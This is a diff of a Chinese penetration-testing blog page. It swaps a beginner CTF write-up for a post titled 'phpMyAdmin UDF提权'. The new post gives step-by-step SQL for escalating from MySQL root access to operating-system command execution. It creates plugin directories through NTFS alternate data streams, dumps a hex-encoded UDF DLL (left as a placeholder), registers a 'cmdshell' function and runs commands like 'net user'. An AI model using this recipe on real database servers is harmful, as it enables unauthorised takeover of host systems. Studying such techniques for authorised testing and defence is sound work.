@@ -4,31 +4,24 @@
 <head>
   <meta charset="UTF-8">
   
-    <title>记一次白帽学院解题过程 | Bug&#39;小虫</title>
+    <title>phpMyAdmin UDF提权 | Bug&#39;小虫</title>
     <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
     
     <meta name="author" content="小虫">
     
 
     
-    <meta name="description" content="首先使用Burp Suit对该链接进行抓包，结果发现并没有什么用。如图：  接下来点了一下post按钮，出现了一堆英文，用有道翻译了一下，说是URL不能为空，点击了那个链接，发现也没用  试试那个链接是不是key，结果不是  做到这头都快大了，不知道URL要填什么，所以就每样都填了一遍，首先把key填过去发现不是，然后把‘答案’这两字填过去还是不是，把验证码填过去也不是，试验太多就不一一截图了，只">
+    <meta name="description" content="适用环境：PhpMyAdmin 3.x  ,  MySQL&amp;gt;5.1  ,  无Shell  ,  无法爆绝对路径前提条件： 有MYSQL的ROOT权限思路：利用NTFS ADS创建 plugin目录 —- 导出UDF 过程：查询1select @@basedir  \\或者 select @@datadir 得到MySQL目录1C:\MySql\ 假如该目录不存在\lib\plugin目录，">
 <meta property="og:type" content="article">
-<meta property="og:title" content="记一次白帽学院解题过程">
-<meta property="og:url" content="http://yoursite.com/2015/05/07/记一次白帽学院解题过程/index.html">
+<meta property="og:title" content="phpMyAdmin UDF提权">
+<meta property="og:url" content="http://yoursite.com/2016/01/01/phpMyAdmin UDF提权/index.html">
 <meta property="og:site_name" content="Bug&#39;小虫">
-<meta property="og:description" content="首先使用Burp Suit对该链接进行抓包，结果发现并没有什么用。如图：  接下来点了一下post按钮，出现了一堆英文，用有道翻译了一下，说是URL不能为空，点击了那个链接，发现也没用  试试那个链接是不是key，结果不是  做到这头都快大了，不知道URL要填什么，所以就每样都填了一遍，首先把key填过去发现不是，然后把‘答案’这两字填过去还是不是，把验证码填过去也不是，试验太多就不一一截图了，只">
+<meta property="og:description" content="适用环境：PhpMyAdmin 3.x  ,  MySQL&amp;gt;5.1  ,  无Shell  ,  无法爆绝对路径前提条件： 有MYSQL的ROOT权限思路：利用NTFS ADS创建 plugin目录 —- 导出UDF 过程：查询1select @@basedir  \\或者 select @@datadir 得到MySQL目录1C:\MySql\ 假如该目录不存在\lib\plugin目录，">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="http://opgnaclz6.bkt.clouddn.com/a1.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim">
-<meta property="og:image" content="http://opgnaclz6.bkt.clouddn.com/a2.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim">
-<meta property="og:image" content="http://opgnaclz6.bkt.clouddn.com/a3.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim">
-<meta property="og:image" content="http://opgnaclz6.bkt.clouddn.com/a4.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim">
-<meta property="og:image" content="http://opgnaclz6.bkt.clouddn.com/a5.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim">
-<meta property="og:image" content="http://opgnaclz6.bkt.clouddn.com/a6.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim">
-<meta property="og:updated_time" content="2018-07-10T15:27:03.844Z">
+<meta property="og:updated_time" content="2018-07-17T17:42:21.193Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="记一次白帽学院解题过程">
-<meta name="twitter:description" content="首先使用Burp Suit对该链接进行抓包，结果发现并没有什么用。如图：  接下来点了一下post按钮，出现了一堆英文，用有道翻译了一下，说是URL不能为空，点击了那个链接，发现也没用  试试那个链接是不是key，结果不是  做到这头都快大了，不知道URL要填什么，所以就每样都填了一遍，首先把key填过去发现不是，然后把‘答案’这两字填过去还是不是，把验证码填过去也不是，试验太多就不一一截图了，只">
-<meta name="twitter:image" content="http://opgnaclz6.bkt.clouddn.com/a1.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim">
+<meta name="twitter:title" content="phpMyAdmin UDF提权">
+<meta name="twitter:description" content="适用环境：PhpMyAdmin 3.x  ,  MySQL&amp;gt;5.1  ,  无Shell  ,  无法爆绝对路径前提条件： 有MYSQL的ROOT权限思路：利用NTFS ADS创建 plugin目录 —- 导出UDF 过程：查询1select @@basedir  \\或者 select @@datadir 得到MySQL目录1C:\MySql\ 假如该目录不存在\lib\plugin目录，">
 
     
     <link rel="alternative" href="/atom.xml" title="Bug&#39;小虫" type="application/atom+xml">
@@ -84,14 +77,14 @@
 		<header class="article-info clearfix">
   <h1 itemprop="name">
     
-      <a href="/2015/05/07/记一次白帽学院解题过程/" title="记一次白帽学院解题过程" itemprop="url">记一次白帽学院解题过程</a>
+      <a href="/2016/01/01/phpMyAdmin UDF提权/" title="phpMyAdmin UDF提权" itemprop="url">phpMyAdmin UDF提权</a>
   </h1>
   <p class="article-author">By
        
 		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
 		
   <p class="article-time">
-    <time datetime="2015-05-07T04:41:35.000Z" itemprop="datePublished"> 发表于 2015-05-07</time>
+    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
     
   </p>
 </header>
@@ -104,18 +97,20 @@
 		
 		</div>
 		
-		<p>首先使用Burp Suit对该链接进行抓包，结果发现并没有什么用。<br>如图：</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a1.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>接下来点了一下post按钮，出现了一堆英文，用有道翻译了一下，说是URL不能为空，点击了那个链接，发现也没用</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a2.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>试试那个链接是不是key，结果不是</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a3.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>做到这头都快大了，不知道URL要填什么，所以就每样都填了一遍，首先把key填过去发现不是，然后把‘答案’这两字填过去还是不是，把验证码填过去也不是，试验太多就不一一截图了，只截一张吧</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a4.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>试到Flag01时居然出现了一行不一样的东西</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a5.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<p>抱着有点小激动并伴着一点点忐忑的心态把他们都复制过去，提示答案错误，然后又试了一下只复制大括号里的，结果竟然做成功了</p>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/a6.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
+		<p>适用环境：PhpMyAdmin 3.x  ,  MySQL&gt;5.1  ,  无Shell  ,  无法爆绝对路径<br>前提条件： 有MYSQL的ROOT权限<br>思路：利用NTFS ADS创建 plugin目录 —- 导出UDF</p>
+<p>过程：<br>查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir  \\或者 select @@datadir</span><br></pre></td></tr></table></figure></p>
+<p>得到MySQL目录<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\MySql\</span><br></pre></td></tr></table></figure></p>
+<p>假如该目录不存在\lib\plugin目录，利用ADS创建<br>查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'xxx'</span> into dumpfile <span class="string">'C:\\MySQL\\lib::$INDEX_ALLOCATION'</span>;</span><br></pre></td></tr></table></figure></p>
+<p>此时会报错<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 3 (HY000): Error writing file <span class="string">'C:\MySQL\lib::$INDEX_ALLOCATION'</span> (Errcode: 22)</span><br></pre></td></tr></table></figure></p>
+<p>但是lib目录已经创建了<br>再查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'xxx'</span> into dumpfile <span class="string">'C:\\MySQL\\lib\\plugin::$INDEX_ALLOCATION'</span>;</span><br></pre></td></tr></table></figure></p>
+<p>导出UDF.DLL<br>随便选一个库<br>查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE Temp_udf(udf BLOB);</span><br></pre></td></tr></table></figure></p>
+<p>查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT into Temp_udf values (CONVERT(<span class="variable">$shellcode</span>,CHAR));   //<span class="variable">$shellcode</span>请用UDF用hex加密后的代码</span><br></pre></td></tr></table></figure></p>
+<p>查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT udf FROM Temp_udf INTO DUMPFILE <span class="string">'C:\\MySQL\\lib\\plugin\\udf.dll'</span>;--</span><br></pre></td></tr></table></figure></p>
+<p>注意：在后面记得要加 – 否者会出错，我在此处浪费无限时间(&gt;4h)<br>原因可能是PhpMyAdmin查询时会自动在语句末尾加上Limit 语句，导致出错</p>
+<p>提权<br>查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Create <span class="keyword">function</span> cmdshell returns string soname <span class="string">'udf.dll'</span>;  //此处不能填绝对路径 只能是dll名</span><br></pre></td></tr></table></figure></p>
+<p>查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from mysql.func;                  //看看cmdshell <span class="keyword">function</span>是否创立，创立就继续</span><br></pre></td></tr></table></figure></p>
+<p>查询<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select cmdshell(<span class="string">'net user'</span>);               //运行各种命令提权</span><br></pre></td></tr></table></figure></p>
+<p>UDF用hex加密后的代码(从某个UDF工具里提取的)</p>
   
 	</div>
 		<footer class="article-footer clearfix">
@@ -123,7 +118,7 @@
 
 <div class="article-categories">
   <span></span>
-  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/其他/">其他</a>
+  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/提权/">提权</a>
 </div>
 
 
@@ -133,7 +128,7 @@
 
 	<div class="article-share" id="share">
 	
-	  <div data-url="http://yoursite.com/2015/05/07/记一次白帽学院解题过程/" data-title="记一次白帽学院解题过程 | Bug&#39;小虫" data-tsina="" class="share clearfix">
+	  <div data-url="http://yoursite.com/2016/01/01/phpMyAdmin UDF提权/" data-title="phpMyAdmin UDF提权 | Bug&#39;小虫" data-tsina="" class="share clearfix">
 	  </div>
 	
 	</div>
@@ -147,13 +142,21 @@
 <nav class="article-nav clearfix">
  
  <div class="prev" >
- <a href="/2016/01/01/phpMyAdmin UDF提权/" title="phpMyAdmin UDF提权">
+ <a href="/2016/01/01/内网渗透命令总结/" title="内网渗透命令总结">
   <strong>上一篇：</strong><br/>
   <span>
-  phpMyAdmin UDF提权</span>
+  内网渗透命令总结</span>
 </a>
 </div>
 
+
+<div class="next">
+<a href="/2015/05/07/记一次白帽学院解题过程/"  title="记一次白帽学院解题过程">
+ <strong>下一篇：</strong><br/> 
+ <span>记一次白帽学院解题过程
+</span>
+</a>
+</div>
 
 </nav>
 
